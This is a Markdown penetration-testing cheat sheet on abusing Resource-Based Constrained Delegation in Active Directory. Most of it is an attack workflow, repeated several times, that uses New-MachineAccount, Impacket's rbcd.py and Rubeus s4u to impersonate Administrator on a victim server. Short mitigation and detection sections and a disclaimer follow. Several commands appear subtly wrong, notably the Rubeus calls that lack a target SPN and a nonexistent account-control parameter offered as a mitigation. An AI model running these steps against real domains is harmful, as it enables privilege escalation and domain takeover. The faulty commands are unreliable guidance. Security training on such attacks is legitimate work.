# **Resource-Based Constrained Delegation (RBCD) - Kerberos Attack**

## **Understanding Resource-Based Constrained Delegation (RBCD)**

- **Resource-Based Constrained Delegation (RBCD)** allows services to delegate user authentication to specific resources. Unlike traditional constrained delegation, the control resides on the **target service (resource)** instead of the delegating account.
- RBCD was introduced to improve security by allowing **resource owners** to decide which services can impersonate users.
- Despite being more secure than traditional constrained delegation, **misconfigurations** can lead to **privilege escalation and lateral movement**.

---

## **How RBCD Works**

1. **Delegation Model:**

   - In RBCD, the **target resource (e.g., server, service)** specifies which accounts can impersonate users on its behalf using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
   - This attribute lists service accounts permitted to delegate to the resource.

2. **Vulnerability:**
   - If an attacker can control or modify this attribute, they can delegate user authentication to **compromise sensitive services**, escalating privileges.

---

## **Tools and Techniques**

### **Enumerating RBCD (PowerView):**

- **Identify machines with RBCD configured:**

  ```powershell
  Get-DomainComputer -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  ```

- **Check RBCD Permissions:**
  ```powershell
  Get-DomainObject -Identity <target_computer> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  ```

---

### **Performing RBCD Attack (Rubeus):**

- **Steps Involved:**
  1.  Create a machine account (if necessary).
  2.  Modify `msDS-AllowedToActOnBehalfOfOtherIdentity` to allow delegation.
  3.  Perform **S4U2Self** and **S4U2Proxy** impersonation.

---

## **Attack Workflow (RBCD):**

### **Step 1: Create Machine Account (Optional)**

```powershell
New-MachineAccount -MachineAccount attackerMachine -Password $(ConvertTo-SecureString "Password123!" -AsPlainText -Force)
```

### **Step 2: Modify RBCD Attribute (Impacket):**

```python
python3 rbcd.py -action write -delegate-account attackerMachine$ -target-computer victim-server$ -dc-ip <dc_ip>
```

- `delegate-account` – The account allowed to delegate.
- `target-computer` – The victim computer.

---

### **Step 3: Impersonate User (S4U2Self & S4U2Proxy):**

```powershell
Rubeus.exe s4u /user:attackerMachine$ /rc4:<hash> /impersonateuser:Administrator /domain:<domain>
```

```powershell
Rubeus.exe s4u /ticket:<tgt.kirbi> /target:cifs/victim-server.domain.local
```

---

## **Example Attack Workflow (Full):**

1. **Create a Machine Account:**

   ```powershell
   New-MachineAccount -MachineAccount evilAccount -Password (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)
   ```

2. **Modify Target's RBCD Attribute:**

   ```python
   python3 rbcd.py -action write -delegate-account evilAccount$ -target-computer victimServer$ -dc-ip 192.168.1.10
   ```

3. **Impersonate Admin via Rubeus:**

   ```powershell
   Rubeus.exe s4u /user:evilAccount$ /rc4:<hash> /impersonateuser:Administrator /domain:corp.local
   ```

4. **Access Services as Admin:**
   ```powershell
   Rubeus.exe s4u /ticket:<tgt.kirbi> /target:cifs/victimServer.corp.local
   ```

---

## **Detection and Mitigation**

### **Mitigation Techniques:**

1. **Restrict RBCD Modifications:**

   - Limit permissions to modify `msDS-AllowedToActOnBehalfOfOtherIdentity`.

   ```powershell
   Set-ADComputer -Identity <target> -Remove @{msDS-AllowedToActOnBehalfOfOtherIdentity="<attacker_machine>"}
   ```

2. **Account Protection:**
   - **Prevent attackers from creating machine accounts** by limiting **`Add workstations to domain`** rights.
   ```powershell
   Get-ADUser -Identity <user> | Set-ADAccountControl -AddWorkstationsToDomain 0
   ```

---

### **Detection Techniques:**

- **Event Logs:**
  - Monitor **Event ID 4769** (TGS-REQ) for unusual service ticket requests.
  - Track **modifications to msDS-AllowedToActOnBehalfOfOtherIdentity**.
- **Audit Machine Account Creation:**
  ```powershell
  Get-EventLog -LogName Security -InstanceId 4741
  ```

---

## **Testing RBCD Configurations**

- **Check for RBCD Attributes:**

  ```powershell
  Get-DomainComputer -Identity <target> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  ```

- **Review Delegation Permissions:**
  ```powershell
  Get-ADComputer -Identity <target> -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
  ```

---

## **Real-World Impact:**

- **Privilege Escalation:**
  - Gain **domain admin access** by modifying constrained delegation on critical servers.
- **Persistence:**
  - Maintain long-term access by configuring RBCD permissions.
- **Lateral Movement:**
  - Pivot across the network through delegation rights abuse.

---

## **Example Scenario (Full):**

1. **Enumerate RBCD Targets:**

   ```powershell
   Get-DomainComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne $null}
   ```

2. **Modify RBCD on Target:**

   ```python
   python3 rbcd.py -action write -delegate-account attackerMachine$ -target-computer web01$
   ```

3. **Impersonate Admin to Target:**

   ```powershell
   Rubeus.exe s4u /user:attackerMachine$ /rc4:<hash> /impersonateuser:Administrator /domain:corp.local
   ```

4. **Access CIFS Services:**
   ```powershell
   Rubeus.exe s4u /ticket:<tgt.kirbi> /target:cifs/web01.corp.local
   ```

---

## **⚠️Disclaimer⚠️**

This guide is for **educational purposes only**. Unauthorized exploitation of RBCD is illegal and unethical. Always conduct penetration tests with **proper authorization**.
